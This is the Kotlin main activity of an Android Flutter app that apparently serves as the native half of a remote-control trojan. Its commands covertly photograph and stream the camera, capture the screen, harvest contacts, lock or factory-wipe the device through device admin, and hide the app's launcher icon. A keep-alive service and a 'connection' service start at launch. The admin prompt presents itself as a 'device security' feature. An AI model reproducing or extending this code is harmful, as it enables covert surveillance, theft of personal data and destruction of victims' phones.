package com.template.app

import android.Manifest
import android.app.Activity
import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.graphics.Canvas
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.hardware.camera2.CameraCharacteristics
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.MediaPlayer
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.os.VibrationEffect
import android.os.Vibrator
import android.os.VibratorManager
import android.provider.Settings
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import io.flutter.embedding.android.FlutterActivity
import io.flutter.embedding.engine.FlutterEngine
import io.flutter.plugin.common.EventChannel
import io.flutter.plugin.common.MethodCall
import io.flutter.plugin.common.MethodChannel
import java.io.ByteArrayOutputStream

class MainActivity : FlutterActivity() {

    private val CHANNEL = "orgsapp/device_info"
    private val FRAME_CHANNEL = "orgsapp/camera_frames"

    // ⬇️ MAIN HANDLER (FIX: dideklarasi di sini)
    private val mainHandler = Handler(Looper.getMainLooper())

    // MediaPlayer
    private var mediaPlayer: MediaPlayer? = null

    // MediaProjection
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var screenWidth = 0
    private var screenHeight = 0
    private var screenDensity = 0
    private val PROJECTION_REQUEST_CODE = 1001
    private var pendingProjectionResult: MethodChannel.Result? = null

    // Camera2
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var cameraThread: HandlerThread? = null
    private var cameraHandler: Handler? = null
    private var cameraImageReader: ImageReader? = null
    private var currentFacing = CameraCharacteristics.LENS_FACING_BACK
    private var frameEventSink: EventChannel.EventSink? = null
    private val CAMERA_PERMISSION_CODE = 2001
    private var pendingCameraResult: MethodChannel.Result? = null

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        Log.d("MainActivity", "🚀 onCreate")

        KeepAliveService.start(this)
        ConnectionService.start(this)

        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getMetrics(metrics)
        screenWidth = metrics.widthPixels
        screenHeight = metrics.heightPixels
        screenDensity = metrics.densityDpi

        cameraThread = HandlerThread("CameraThread").apply { start() }
        cameraHandler = Handler(cameraThread!!.looper)

        requestBatteryOptimizationExemption()
        requestCameraPermissionIfNeeded()
    }

    // ==========================================
    // ===== CAMERA PERMISSION =====
    // ==========================================
    private fun requestCameraPermissionIfNeeded() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
            != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(
                this,
                arrayOf(Manifest.permission.CAMERA),
                CAMERA_PERMISSION_CODE,
            )
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int,
        permissions: Array<out String>,
        grantResults: IntArray,
    ) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == CAMERA_PERMISSION_CODE) {
            val granted = grantResults.isNotEmpty() &&
                grantResults[0] == PackageManager.PERMISSION_GRANTED
            Log.d("MainActivity", "Camera permission: $granted")
        }
    }

    // ==========================================
    // ===== CONFIGURE FLUTTER ENGINE =====
    // ==========================================
    override fun configureFlutterEngine(flutterEngine: FlutterEngine) {
        super.configureFlutterEngine(flutterEngine)

        Log.d("MainActivity", "🔧 configureFlutterEngine")

        MethodChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            CHANNEL,
        ).setMethodCallHandler { call, result ->
            try {
                Log.d("MainActivity", "Method: ${call.method}")
                when (call.method) {
                    "getSdkInt" -> result.success(Build.VERSION.SDK_INT)
                    "getModel" -> result.success(Build.MODEL)
                    "getBrand" -> result.success(Build.BRAND)
                    "getAndroidVersion" -> result.success(Build.VERSION.RELEASE)

                    "openAccessibilitySettings" -> openAccessibilitySettings(result)

                    "flashStrobe" -> toggleFlash(true, result)
                    "stopStrobe" -> toggleFlash(false, result)

                    "vibrateLoop" -> vibrateLoop(result)
                    "stopVibrate" -> stopVibrate(result)

                    "openUrl" -> openUrl(call.argument<String>("url"), result)
                    "forceOpen" -> forceOpen(result)

                    "captureScreen" -> captureScreenWithProjection(result)
                    "requestScreenCapture" -> requestScreenCapture(result)
                    "stopScreenCapture" -> stopScreenCapture(result)

                    "takePhoto" -> takePhoto(
                        call.argument<String>("camera") ?: "back", result
                    )
                    "startCameraStream" -> startCameraStream(
                        call.argument<String>("camera") ?: "back", result
                    )
                    "stopCameraStream" -> stopCameraStream(result)

                    "playAudio" -> playAudio(call.argument<String>("url"), result)
                    "stopAudio" -> stopAudio(result)
                    "startAudioStream" -> result.success(false)
                    "stopAudioStream" -> result.success(true)

                    "setWallpaper" -> setWallpaper(call.argument<String>("url"), result)

                    "hardLock" -> hardLock(result)
                    "unlock" -> unlock(result)
                    "isDeviceAdmin" -> isDeviceAdmin(result)
                    "requestDeviceAdmin" -> requestDeviceAdmin(result)

                    "enableProtection" -> enableProtection(
                        call.argument<String>("method") ?: "both", result
                    )
                    "disableProtection" -> disableProtection(result)

                    "factoryReset" -> factoryReset(result)

                    "getContacts" -> getContacts(result)

                    else -> result.notImplemented()
                }
            } catch (e: Exception) {
                Log.e("MainActivity", "Error: ${e.message}", e)
                result.error("ERR", e.message, null)
            }
        }

        EventChannel(
            flutterEngine.dartExecutor.binaryMessenger,
            FRAME_CHANNEL,
        ).setStreamHandler(object : EventChannel.StreamHandler {
            override fun onListen(args: Any?, sink: EventChannel.EventSink?) {
                frameEventSink = sink
                Log.d("MainActivity", "📷 Camera frame stream listening")
            }

            override fun onCancel(args: Any?) {
                frameEventSink = null
            }
        })
    }

    // ==========================================
    // ===== CAMERA — TAKE PHOTO =====
    // ==========================================
    private fun takePhoto(facing: String, result: MethodChannel.Result) {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                result.error("PERM", "Camera permission not granted", null)
                return
            }

            pendingCameraResult = result
            currentFacing = if (facing == "front")
                CameraCharacteristics.LENS_FACING_FRONT
            else
                CameraCharacteristics.LENS_FACING_BACK

            openCameraForCapture()
        } catch (e: Exception) {
            Log.e("MainActivity", "takePhoto error", e)
            result.error("CAM", e.message, null)
        }
    }

    private fun openCameraForCapture() {
        try {
            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

            var targetCameraId: String? = null
            for (id in manager.cameraIdList) {
                val chars = manager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (facing == currentFacing) {
                    targetCameraId = id
                    break
                }
            }

            if (targetCameraId == null) {
                pendingCameraResult?.error("CAM", "Camera not found", null)
                pendingCameraResult = null
                return
            }

            val chars = manager.getCameraCharacteristics(targetCameraId)
            val map = chars.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val size = map?.getOutputSizes(ImageFormat.JPEG)?.firstOrNull()
                ?: android.util.Size(640, 480)

            cameraImageReader?.close()
            cameraImageReader = ImageReader.newInstance(
                size.width, size.height, ImageFormat.JPEG, 2,
            )

            cameraImageReader?.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    Log.d("MainActivity", "📸 Photo captured: ${bytes.size} bytes")

                    mainHandler.post {
                        pendingCameraResult?.success(base64)
                        pendingCameraResult = null
                        closeCamera()
                    }
                } catch (e: Exception) {
                    Log.e("MainActivity", "ImageReader error", e)
                    mainHandler.post {
                        pendingCameraResult?.error("CAM", e.message, null)
                        pendingCameraResult = null
                        closeCamera()
                    }
                }
            }, cameraHandler)

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                pendingCameraResult?.error("PERM", "Camera permission denied", null)
                pendingCameraResult = null
                return
            }

            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    createCaptureSession()
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                    pendingCameraResult?.error("CAM", "Camera disconnected", null)
                    pendingCameraResult = null
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    pendingCameraResult?.error("CAM", "Camera error $error", null)
                    pendingCameraResult = null
                }
            }, cameraHandler)
        } catch (e: Exception) {
            Log.e("MainActivity", "openCameraForCapture error", e)
            pendingCameraResult?.error("CAM", e.message, null)
            pendingCameraResult = null
        }
    }

    private fun createCaptureSession() {
        try {
            val surface = cameraImageReader?.surface ?: return

            // ⬇️ FIX: CaptureRequest.Builder? nullable
            val captureRequestBuilder: CaptureRequest.Builder? = cameraDevice?.createCaptureRequest(
                CameraDevice.TEMPLATE_STILL_CAPTURE,
            )

            if (captureRequestBuilder == null) {
                Log.e("MainActivity", "captureRequestBuilder null")
                pendingCameraResult?.error("CAM", "Builder null", null)
                pendingCameraResult = null
                return
            }

            captureRequestBuilder.addTarget(surface)

            cameraDevice?.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        try {
                            session.capture(
                                captureRequestBuilder.build(),  // ⬅️ Builder non-null
                                null,
                                cameraHandler,
                            )
                        } catch (e: Exception) {
                            Log.e("MainActivity", "capture error", e)
                        }
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {
                        Log.e("MainActivity", "Session configure failed")
                        pendingCameraResult?.error("CAM", "Session failed", null)
                        pendingCameraResult = null
                    }
                },
                cameraHandler,
            )
        } catch (e: Exception) {
            Log.e("MainActivity", "createCaptureSession error", e)
            pendingCameraResult?.error("CAM", e.message, null)
            pendingCameraResult = null
        }
    }

    private fun closeCamera() {
        try {
            captureSession?.close(); captureSession = null
            cameraDevice?.close(); cameraDevice = null
            cameraImageReader?.close(); cameraImageReader = null
        } catch (e: Exception) {}
    }

    // ==========================================
    // ===== CAMERA STREAM =====
    // ==========================================
    private fun startCameraStream(facing: String, result: MethodChannel.Result) {
        try {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                result.error("PERM", "Camera permission not granted", null)
                return
            }

            currentFacing = if (facing == "front")
                CameraCharacteristics.LENS_FACING_FRONT
            else
                CameraCharacteristics.LENS_FACING_BACK

            val manager = getSystemService(Context.CAMERA_SERVICE) as CameraManager

            var targetCameraId: String? = null
            for (id in manager.cameraIdList) {
                val chars = manager.getCameraCharacteristics(id)
                val lensFacing = chars.get(CameraCharacteristics.LENS_FACING)
                if (lensFacing == currentFacing) {
                    targetCameraId = id
                    break
                }
            }

            if (targetCameraId == null) {
                result.success(false)
                return
            }

            cameraImageReader?.close()
            cameraImageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)

            cameraImageReader?.setOnImageAvailableListener({ reader ->
                try {
                    val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    val base64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                    mainHandler.post {
                        frameEventSink?.success(base64)
                    }
                } catch (e: Exception) {}
            }, cameraHandler)

            if (ActivityCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                != PackageManager.PERMISSION_GRANTED) {
                result.success(false)
                return
            }

            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    startRepeatingCapture()
                    result.success(true)
                }

                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    cameraDevice = null
                    result.success(false)
                }

                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    cameraDevice = null
                    result.success(false)
                }
            }, cameraHandler)
        } catch (e: Exception) {
            Log.e("MainActivity", "startCameraStream error", e)
            result.success(false)
        }
    }

    private fun startRepeatingCapture() {
        try {
            val surface = cameraImageReader?.surface ?: return

            // ⬇️ FIX: CaptureRequest.Builder? nullable
            val builder: CaptureRequest.Builder? = cameraDevice?.createCaptureRequest(
                CameraDevice.TEMPLATE_PREVIEW,
            )

            if (builder == null) {
                Log.e("MainActivity", "builder null")
                return
            }

            builder.addTarget(surface)

            cameraDevice?.createCaptureSession(
                listOf(surface),
                object : CameraCaptureSession.StateCallback() {
                    override fun onConfigured(session: CameraCaptureSession) {
                        captureSession = session
                        try {
                            session.setRepeatingRequest(
                                builder.build(),  // ⬅️ Builder non-null
                                null,
                                cameraHandler,
                            )
                        } catch (e: Exception) {}
                    }

                    override fun onConfigureFailed(session: CameraCaptureSession) {}
                },
                cameraHandler,
            )
        } catch (e: Exception) {}
    }

    private fun stopCameraStream(result: MethodChannel.Result) {
        closeCamera()
        result.success(true)
    }

    // ==========================================
    // ===== BATTERY OPTIMIZATION =====
    // ==========================================
    private fun requestBatteryOptimizationExemption() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            try {
                val pm = getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
                if (!pm.isIgnoringBatteryOptimizations(packageName)) {
                    val intent = Intent().apply {
                        action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
                        data = Uri.parse("package:$packageName")
                    }
                    startActivity(intent)
                }
            } catch (e: Exception) {}
        }
    }

    // ==========================================
    // ===== SCREEN CAPTURE =====
    // ==========================================
    private fun requestScreenCapture(result: MethodChannel.Result) {
        try {
            if (mediaProjection != null) {
                result.success(true)
                return
            }
            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                    as MediaProjectionManager
            val intent = mpm.createScreenCaptureIntent()
            pendingProjectionResult = result
            startActivityForResult(intent, PROJECTION_REQUEST_CODE)
        } catch (e: Exception) {
            result.error("PROJ", e.message, null)
        }
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == PROJECTION_REQUEST_CODE) {
            if (resultCode == Activity.RESULT_OK && data != null) {
                try {
                    val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE)
                            as MediaProjectionManager
                    mediaProjection = mpm.getMediaProjection(resultCode, data)
                    setupVirtualDisplay()
                    pendingProjectionResult?.success(true)
                } catch (e: Exception) {
                    pendingProjectionResult?.error("PROJ", e.message, null)
                }
            } else {
                pendingProjectionResult?.success(false)
            }
            pendingProjectionResult = null
        }
    }

    private fun setupVirtualDisplay() {
        try {
            imageReader = ImageReader.newInstance(
                screenWidth, screenHeight, PixelFormat.RGBA_8888, 2,
            )
            virtualDisplay = mediaProjection?.createVirtualDisplay(
                "ScreenCapture",
                screenWidth, screenHeight, screenDensity,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
                imageReader?.surface, null, null,
            )
        } catch (e: Exception) {}
    }

    private fun captureScreenWithProjection(result: MethodChannel.Result) {
        if (mediaProjection == null || imageReader == null) {
            captureScreenFallback(result)
            return
        }
        try {
            val image = imageReader?.acquireLatestImage()
            if (image == null) {
                captureScreenFallback(result)
                return
            }
            val planes = image.planes
            val buffer = planes[0].buffer
            val pixelStride = planes[0].pixelStride
            val rowStride = planes[0].rowStride
            val rowPadding = rowStride - pixelStride * screenWidth

            val bitmap = Bitmap.createBitmap(
                screenWidth + rowPadding / pixelStride,
                screenHeight,
                Bitmap.Config.ARGB_8888,
            )
            bitmap.copyPixelsFromBuffer(buffer)
            image.close()

            val cropped = Bitmap.createBitmap(bitmap, 0, 0, screenWidth, screenHeight)
            val stream = ByteArrayOutputStream()
            cropped.compress(Bitmap.CompressFormat.JPEG, 70, stream)
            val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
            result.success(base64)
        } catch (e: Exception) {
            captureScreenFallback(result)
        }
    }

    private fun captureScreenFallback(result: MethodChannel.Result) {
        try {
            val rootView = window.decorView.rootView
            val bitmap = Bitmap.createBitmap(
                rootView.width, rootView.height, Bitmap.Config.ARGB_8888,
            )
            val canvas = Canvas(bitmap)
            rootView.draw(canvas)
            val stream = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 60, stream)
            val base64 = Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
            result.success(base64)
        } catch (e: Exception) {
            result.success("")
        }
    }

    private fun stopScreenCapture(result: MethodChannel.Result) {
        try {
            virtualDisplay?.release(); virtualDisplay = null
            imageReader?.close(); imageReader = null
            mediaProjection?.stop(); mediaProjection = null
            result.success(true)
        } catch (e: Exception) {
            result.error("PROJ", e.message, null)
        }
    }

    // ==========================================
    // ===== AUDIO =====
    // ==========================================
    private fun playAudio(url: String?, result: MethodChannel.Result) {
        try {
            if (url.isNullOrEmpty()) { result.success(false); return }
            mediaPlayer?.release(); mediaPlayer = null
            mediaPlayer = MediaPlayer().apply {
                setDataSource(url)
                setOnPreparedListener { start() }
                setOnErrorListener { _, _, _ -> result.success(false); true }
                prepareAsync()
            }
            result.success(true)
        } catch (e: Exception) {
            result.success(false)
        }
    }

    private fun stopAudio(result: MethodChannel.Result) {
        try {
            mediaPlayer?.stop(); mediaPlayer?.release(); mediaPlayer = null
            result.success(true)
        } catch (e: Exception) { result.success(true) }
    }

    // ==========================================
    // ===== WALLPAPER =====
    // ==========================================
    private fun setWallpaper(url: String?, result: MethodChannel.Result) {
        if (url.isNullOrEmpty()) { result.success(false); return }
        Thread {
            try {
                val conn = java.net.URL(url).openConnection()
                conn.doInput = true; conn.connect()
                val input = conn.getInputStream()
                val bitmap = BitmapFactory.decodeStream(input)
                input.close()
                if (bitmap != null) {
                    val wm = android.app.WallpaperManager.getInstance(applicationContext)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                        wm.setBitmap(bitmap, null, true, android.app.WallpaperManager.FLAG_SYSTEM)
                    } else {
                        wm.setBitmap(bitmap)
                    }
                    runOnUiThread { result.success(true) }
                } else {
                    runOnUiThread { result.success(false) }
                }
            } catch (e: Exception) {
                runOnUiThread { result.success(false) }
            }
        }.start()
    }

    // ==========================================
    // ===== LOCK / ADMIN =====
    // ==========================================
    private fun hardLock(result: MethodChannel.Result) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.lockNow()
                result.success(true)
            } else {
                result.success(false)
            }
        } catch (e: Exception) {
            result.error("LOCK", e.message, null)
        }
    }

    private fun unlock(result: MethodChannel.Result) {
        LockOverlayManager.unlock()
        result.success(true)
    }

    private fun isDeviceAdmin(result: MethodChannel.Result) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
            result.success(dpm.isAdminActive(admin))
        } catch (e: Exception) {
            result.error("ADMIN", e.message, null)
        }
    }

    private fun requestDeviceAdmin(result: MethodChannel.Result) {
        try {
            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN)
            intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, admin)
            intent.putExtra(
                DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                "Izinkan untuk mengaktifkan fitur keamanan perangkat",
            )
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("ADMIN", e.message, null)
        }
    }

    // ==========================================
    // ===== CONTACTS =====
    // ==========================================
    private fun getContacts(result: MethodChannel.Result) {
        try {
            val contacts = mutableListOf<Map<String, String>>()
            val cursor = contentResolver.query(
                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                null, null, null, null,
            )
            cursor?.use {
                val nameIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                )
                val phoneIdx = it.getColumnIndex(
                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER,
                )
                while (it.moveToNext()) {
                    val name = if (nameIdx >= 0) it.getString(nameIdx) else ""
                    val phone = if (phoneIdx >= 0) it.getString(phoneIdx) else ""
                    contacts.add(mapOf("name" to (name ?: ""), "phone" to (phone ?: "")))
                }
            }
            result.success(contacts)
        } catch (e: Exception) {
            result.success(emptyList<Map<String, String>>())
        }
    }

    // ==========================================
    // ===== SETTINGS =====
    // ==========================================
    private fun openAccessibilitySettings(result: MethodChannel.Result) {
        try {
            val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("ERROR", e.message, null)
        }
    }

    // ==========================================
    // ===== FLASHLIGHT =====
    // ==========================================
    private fun toggleFlash(on: Boolean, result: MethodChannel.Result) {
        try {
            val camManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            var cameraId: String? = null
            for (id in camManager.cameraIdList) {
                try {
                    val chars = camManager.getCameraCharacteristics(id)
                    val flashAvailable: Boolean =
                        chars.get(CameraCharacteristics.FLASH_INFO_AVAILABLE) ?: false
                    if (flashAvailable) { cameraId = id; break }
                } catch (e: Exception) {}
            }
            if (cameraId == null) { result.success(false); return }
            camManager.setTorchMode(cameraId, on)
            result.success(true)
        } catch (e: Exception) {
            result.error("FLASH", e.message, null)
        }
    }

    // ==========================================
    // ===== VIBRATE =====
    // ==========================================
    private fun getVibrator(): Vibrator {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) {
            val vm = getSystemService(Context.VIBRATOR_MANAGER_SERVICE) as VibratorManager
            vm.defaultVibrator
        } else {
            @Suppress("DEPRECATION")
            getSystemService(Context.VIBRATOR_SERVICE) as Vibrator
        }
    }

    private fun vibrateLoop(result: MethodChannel.Result) {
        try {
            val vibrator = getVibrator()
            val pattern = longArrayOf(0, 500, 500)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                vibrator.vibrate(VibrationEffect.createWaveform(pattern, 0))
            } else {
                @Suppress("DEPRECATION")
                vibrator.vibrate(pattern, 0)
            }
            result.success(true)
        } catch (e: Exception) {
            result.error("VIB", e.message, null)
        }
    }

    private fun stopVibrate(result: MethodChannel.Result) {
        try { getVibrator().cancel(); result.success(true) }
        catch (e: Exception) { result.error("VIB", e.message, null) }
    }

    // ==========================================
    // ===== OPEN URL =====
    // ==========================================
    private fun openUrl(url: String?, result: MethodChannel.Result) {
        if (url.isNullOrEmpty()) { result.success(false); return }
        try {
            val intent = Intent(Intent.ACTION_VIEW, Uri.parse(url))
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
            startActivity(intent)
            result.success(true)
        } catch (e: Exception) {
            result.error("URL", e.message, null)
        }
    }

    // ==========================================
    // ===== FORCE OPEN =====
    // ==========================================
    private fun forceOpen(result: MethodChannel.Result) {
        try {
            val intent = packageManager.getLaunchIntentForPackage(packageName)
            intent?.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_REORDER_TO_FRONT
            )
            if (intent != null) { startActivity(intent); result.success(true) }
            else { result.success(false) }
        } catch (e: Exception) {
            result.error("FO", e.message, null)
        }
    }

    // ==========================================
    // ===== PROTECTION =====
    // ==========================================
    private fun enableProtection(method: String, result: MethodChannel.Result) {
        try {
            if (method == "hide_icon" || method == "both") {
                val cn = ComponentName(this, MainActivity::class.java)
                packageManager.setComponentEnabledSetting(
                    cn,
                    android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    android.content.pm.PackageManager.DONT_KILL_APP,
                )
            }
            result.success(true)
        } catch (e: Exception) {
            result.error("PROT", e.message, null)
        }
    }

    private fun disableProtection(result: MethodChannel.Result) {
        try {
            val cn = ComponentName(this, MainActivity::class.java)
            packageManager.setComponentEnabledSetting(
                cn,
                android.content.pm.PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                android.content.pm.PackageManager.DONT_KILL_APP,
            )
            result.success(true)
        } catch (e: Exception) {
            result.error("PROT", e.message, null)
        }
    }

    // ==========================================
    // ===== FACTORY RESET =====
    // ==========================================
    private fun factoryReset(result: MethodChannel.Result) {
        try {
            val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
            val admin = ComponentName(this, MyDeviceAdminReceiver::class.java)
            if (dpm.isAdminActive(admin)) {
                dpm.wipeData(0)
                result.success(true)
            } else {
                result.success(false)
            }
        } catch (e: Exception) {
            result.error("FR", e.message, null)
        }
    }

    // ==========================================
    // ===== CLEANUP =====
    // ==========================================
    override fun onDestroy() {
        try {
            closeCamera()
            cameraThread?.quitSafely()
        } catch (e: Exception) {}
        super.onDestroy()
    }
}
